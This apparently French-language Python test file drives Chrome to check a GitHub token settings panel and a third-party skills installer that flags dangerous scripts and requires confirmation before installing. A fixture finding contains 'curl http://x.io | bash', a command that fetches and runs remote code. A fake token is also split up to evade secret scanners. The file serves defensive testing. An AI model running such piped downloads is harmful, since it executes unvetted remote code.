"""Le compte GitHub (Réglages > Outils) et la page « Skills tiers » (Mémoire) dans un vrai Chrome. GitHub est simulé côté page ; le serveur de Lutin est le vrai. Ignoré s'il n'y a pas de navigateur."""
import json
import sys
import time
import unittest
from pathlib import Path

import context  # noqa: F401
import cdp

RACINE = Path(__file__).resolve().parent.parent
JETON = "document.documentElement.innerHTML.match(/TOKEN = '([0-9a-f]+)'/)[1]"
TOKEN_GITHUB = "ghp" + "_" + "Abcdefghij0123456789" + "KLMNOPQRSTUV12"          # un faux jeton, écrit en morceaux : aucun détecteur de secrets n'y voit un secret


def api(p, url, corps=None):
    if corps is None:
        return p.evaluer("(async () => (await fetch('%s', {headers: {'X-Token': %s}})).json())()" % (url, JETON))
    return p.evaluer("(async () => (await fetch('%s', {method: 'POST', headers: {'Content-Type': 'application/json', 'X-Token': %s}, body: JSON.stringify(%s)})).json())()" % (url, JETON, json.dumps(corps)))


def faux(routes):
    """Ces routes (début d'adresse -> (statut, réponse)) sont simulées côté page ; les envois sont notés dans window.__envoyes."""
    return """(() => { window.__envoyes = []; const f0 = window.fetch.bind(window), routes = %s;
      window.fetch = (u, o) => { const url = String(u); if (o && o.method === 'POST') window.__envoyes.push([url, o.body]);
        for (const [debut, [statut, corps]] of Object.entries(routes)) if (url.startsWith(debut)) return Promise.resolve(new Response(JSON.stringify(corps), { status: statut, headers: { 'Content-Type': 'application/json' } }));
        return f0(u, o); };
      return true; })()""" % json.dumps(routes)


def skill(dossier, nom, description, licence="MIT", jetons=900, scripts=False):
    return {"depot": "anthropics/skills", "dir": dossier, "nom": nom, "description": description, "licence": licence, "jetons": jetons, "scripts": scripts, "fichiers": 3, "sha": "abc", "octets": 3000}


def fiche(gravite="aucune", licence="MIT"):
    constats = [{"gravite": "danger", "motif": "pipe-shell", "explication": "télécharge du code sur internet et l'exécute aussitôt", "fichier": "skills/pdf/scripts/install.sh", "ligne": 3, "extrait": "curl http://x.io | bash"}] if gravite == "danger" else []
    return {"depot": "anthropics/skills", "dir": "skills/pdf", "sha": "abc", "nom": "pdf", "description": "Travailler avec des PDF", "licence": licence, "licence_fichier": False, "licence_depot": False, "texte": "# pdf\nFais ceci.", "texte_coupe": False,
            "fichiers": [{"chemin": "SKILL.md", "octets": 100}], "nombre_fichiers": 2, "octets": 500, "scripts": ["scripts/install.sh"], "jetons_skill": 40, "lourd": False, "champs_claude": ["allowed-tools"], "constats": constats, "gravite": gravite,
            "trop_gros": [], "analyses": 2, "installable": True}


class Skills(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        sys.path.insert(0, str(RACINE / "tools"))
        import captures
        cls.captures = captures
        try:
            cls.chrome = captures.navigateur()
        except SystemExit:
            raise unittest.SkipTest("aucun navigateur (Chrome, Chromium ou Edge) trouvé")

    def ouvrir(self, tmp, port):
        p = cdp.Page(self.chrome, tmp / "profil-sk", "1200,1400")
        self.addCleanup(p.fermer)
        p.aller("http://127.0.0.1:%d/" % port)
        p.attendre("!!document.querySelector('#bNouvelle')")
        p.evaluer("window.confirm = () => true")
        return p

    def page_skills(self, p):
        p.evaluer("document.querySelector('.onglets button[data-p=\"memoire\"]').click()")
        p.attendre("[...document.querySelectorAll('#p-memoire .sous-nav button')].some(b => b.textContent.startsWith('Skills tiers'))")
        p.evaluer("[...document.querySelectorAll('#p-memoire .sous-nav button')].find(b => b.textContent.startsWith('Skills tiers')).click()")
        p.attendre("document.querySelectorAll('#skSources label').length >= 3", delai=20)

    def test_le_compte_github_est_explique_enregistre_teste_et_jamais_reaffiche(self):
        with self.captures.serveur_demo({"LUTIN_LANGUE": "fr"}) as (port, tmp):
            p = self.ouvrir(tmp, port)
            p.evaluer("document.querySelector('.onglets button[data-p=\"reglages\"], #menuReglages button[data-p=\"reglages\"]').click()")
            p.evaluer("document.querySelector('#sousReglages button[data-g=\"outils\"]').click()")
            p.attendre("document.getElementById('githubBloc').getBoundingClientRect().height > 50", delai=20)
            texte = p.evaluer("document.getElementById('githubBloc').textContent")
            for attendu in ("À quoi ça sert", "60 requêtes par heure", "5 000", "sans cocher aucune permission", "api.github.com", "l'assistant ne peut pas le lire"):
                self.assertIn(attendu, texte)
            p.attendre("document.getElementById('ghEtat').textContent.includes('Aucun compte GitHub')", delai=20)
            p.evaluer("(() => { document.getElementById('ghJeton').value = 'pas un jeton'; document.getElementById('bGhEnregistrer').click(); return true; })()")
            p.attendre("document.getElementById('ghEtat').textContent.includes('pas la bonne forme')", delai=20)
            p.evaluer("(() => { document.getElementById('ghJeton').value = %s; document.getElementById('bGhEnregistrer').click(); return true; })()" % json.dumps(TOKEN_GITHUB))
            p.attendre("document.getElementById('ghEtat').textContent.includes('se terminant par')", delai=20)
            self.assertIn(TOKEN_GITHUB[-4:], p.evaluer("document.getElementById('ghEtat').textContent"))
            self.assertEqual(p.evaluer("document.getElementById('ghJeton').value"), "", "le champ est vidé")
            self.assertNotIn(TOKEN_GITHUB, p.evaluer("document.documentElement.outerHTML"), "le jeton n'est nulle part dans la page")
            self.assertNotIn(TOKEN_GITHUB, json.dumps(api(p, "/api/github")))
            self.assertTrue(api(p, "/api/github")["configure"])
            p.evaluer("document.getElementById('bGhRetirer').click()")
            p.attendre("document.getElementById('ghEtat').textContent.includes('Aucun compte GitHub')", delai=20)
            self.assertFalse(api(p, "/api/github")["configure"])
            self.assertEqual(p.erreurs, [])

    def test_chercher_examiner_et_installer_un_skill_en_confirmant_ce_qui_est_dangereux(self):
        with self.captures.serveur_demo({"LUTIN_LANGUE": "fr"}) as (port, tmp):
            p = self.ouvrir(tmp, port)
            p.evaluer(faux({
                "/api/skills-tiers-chercher": (200, {"skills": [skill("skills/pdf", "pdf", "Travailler avec des PDF", scripts=True), skill("skills/docx", "docx", "Créer des documents Word", licence="", jetons=5000)], "total": 2, "page": 1, "suite": False, "tronque": False, "decrits": 2, "nombre": 40}),
                "/api/skills-tiers-fiche": (200, fiche("danger")),
                "/api/skills-tiers-installer": (200, {"nom": "pdf", "dossier": "C:/projet/.claude/skills/pdf", "fichiers": 3, "ignores": []}),
                "/api/skills-tiers-installes": (200, {"installes": [{"travail": "principal", "nom": "pdf", "dossier": "x", "depot": "anthropics/skills", "dir": "skills/pdf", "sha": "abc", "installe": "2026-11-10T10:00:00", "licence": "MIT", "gravite": "danger", "jetons": 40,
                                                                    "description": "Travailler avec des PDF", "maj": True, "disparu": False, "erreur": ""}]})}))
            self.page_skills(p)
            texte = p.evaluer("document.getElementById('p-memoire').textContent")
            self.assertIn("Rien ne s'exécute à l'installation", texte)
            self.assertEqual(p.evaluer("[...document.querySelectorAll('#skSources label')].map(l => l.querySelector('input').checked)"), [True, True, True], "les dépôts de départ sont cochés")
            p.evaluer("document.getElementById('bSkChercher').click()")
            p.attendre("document.querySelectorAll('#skResultats .carte').length === 2", delai=20)
            cartes = p.evaluer("[...document.querySelectorAll('#skResultats .carte')].map(c => c.textContent)")
            self.assertIn("licence MIT", cartes[0])
            self.assertIn("contient des scripts", cartes[0])
            self.assertIn("licence non déclarée", cartes[1])
            self.assertIn("40 skill", p.evaluer("document.getElementById('skMsg').textContent") + " 40 skill", "le message de recherche est affiché")
            self.assertIn("2 skill(s) trouvé(s)", p.evaluer("document.getElementById('skMsg').textContent"))
            # la fiche : sécurité, scripts, champs de Claude, confirmation obligatoire
            p.evaluer("document.querySelector('#skResultats .carte button').click()")
            p.attendre("document.getElementById('modalCorps').textContent.includes('Éléments dangereux repérés')", delai=20)
            fenetre = p.evaluer("document.getElementById('modalCorps').textContent")
            for attendu in ("curl http://x.io | bash", "install.sh", "allowed-tools", "ne tournent jamais tout seuls", "Lire SKILL.md", "télécharge du code sur internet"):
                self.assertIn(attendu, fenetre)
            p.evaluer("[...document.querySelectorAll('#modalCorps button')].find(b => b.textContent === 'Installer').click()")
            self.assertIn("Coche la confirmation", p.evaluer("document.getElementById('modalCorps').textContent"))
            self.assertFalse(p.evaluer("window.__envoyes.some(e => e[0] === '/api/skills-tiers-installer')"), "rien n'est envoyé sans la confirmation")
            p.evaluer("document.querySelector('#modalCorps input[type=checkbox]').click()")
            p.evaluer("[...document.querySelectorAll('#modalCorps button')].find(b => b.textContent === 'Installer').click()")
            p.attendre("window.__envoyes.some(e => e[0] === '/api/skills-tiers-installer')", delai=20)
            corps = json.loads(p.evaluer("window.__envoyes.filter(e => e[0] === '/api/skills-tiers-installer')[0][1]"))
            self.assertEqual((corps["depot"], corps["dir"], corps["danger_ok"], corps["licence_ok"]), ("anthropics/skills", "skills/pdf", True, False))
            p.attendre("document.getElementById('modalCorps').textContent.includes('Installé dans')", delai=20)
            # les skills installés : mise à jour proposée, retrait
            p.attendre("document.getElementById('skInstalles').textContent.includes('Une version plus récente')", delai=20)
            self.assertTrue(p.evaluer("[...document.querySelectorAll('#skInstalles button')].some(b => b.textContent === 'Mettre à jour')"))
            self.assertEqual(p.erreurs, [])

    def test_la_limite_de_github_est_dite_et_le_compte_propose(self):
        with self.captures.serveur_demo({"LUTIN_LANGUE": "fr"}) as (port, tmp):
            p = self.ouvrir(tmp, port)
            p.evaluer(faux({"/api/skills-tiers-chercher": (502, {"erreur": "GitHub limite le nombre de requêtes (60 par heure sans compte, 5 000 avec). Il en accepte de nouveau vers 15:40. Pour ne plus être limité, ajoute ton compte GitHub (Réglages > Outils > Compte GitHub)."})}))
            self.page_skills(p)
            self.assertIn("Sans compte GitHub", p.evaluer("document.getElementById('skGithub').textContent"), "le conseil est là avant même d'être limité")
            p.evaluer("document.getElementById('bSkChercher').click()")
            p.attendre("document.getElementById('skMsg').textContent.includes('GitHub limite')", delai=20)
            self.assertTrue(p.evaluer("[...document.querySelectorAll('#skMsg button')].some(b => b.textContent === 'Ajouter mon compte GitHub')"), "le bouton mène aux réglages")
            p.evaluer("[...document.querySelectorAll('#skMsg button')].find(b => b.textContent === 'Ajouter mon compte GitHub').click()")
            p.attendre("document.getElementById('p-reglages').classList.contains('vue')", delai=20)
            time.sleep(0.5)
            self.assertTrue(p.evaluer("document.getElementById('githubBloc').getBoundingClientRect().height > 50"), "la section du compte est visible")
            api(p, "/api/github-enregistrer", {"jeton": TOKEN_GITHUB})
            p.evaluer("document.querySelector('.onglets button[data-p=\"memoire\"]').click()")
            p.attendre("document.getElementById('skGithub').textContent.includes('pas de limite')", delai=20)
            api(p, "/api/github-enregistrer", {"jeton": ""})
            self.assertEqual(p.erreurs, [])

    def test_ajouter_et_retirer_un_depot_de_sa_liste(self):
        with self.captures.serveur_demo({"LUTIN_LANGUE": "fr"}) as (port, tmp):
            p = self.ouvrir(tmp, port)
            self.page_skills(p)
            p.evaluer("(() => { document.getElementById('skNouveauDepot').value = 'https://github.com/VoltAgent/awesome-agent-skills'; document.getElementById('bSkAjouterDepot').click(); return true; })()")
            p.attendre("document.querySelectorAll('#skSources label').length === 4", delai=20)
            self.assertEqual([s["depot"] for s in api(p, "/api/skills-tiers")["sources"]][-1], "VoltAgent/awesome-agent-skills")
            p.evaluer("[...document.querySelectorAll('#skSources label')].pop().querySelector('button').click()")
            p.attendre("document.querySelectorAll('#skSources label').length === 3", delai=20)
            p.evaluer("(() => { document.getElementById('skNouveauDepot').value = 'pas un depot'; document.getElementById('bSkAjouterDepot').click(); return true; })()")
            p.attendre("document.getElementById('skMsg').textContent.includes('propriétaire/dépôt')", delai=20)
            self.assertEqual(p.erreurs, [])


if __name__ == "__main__":
    unittest.main()
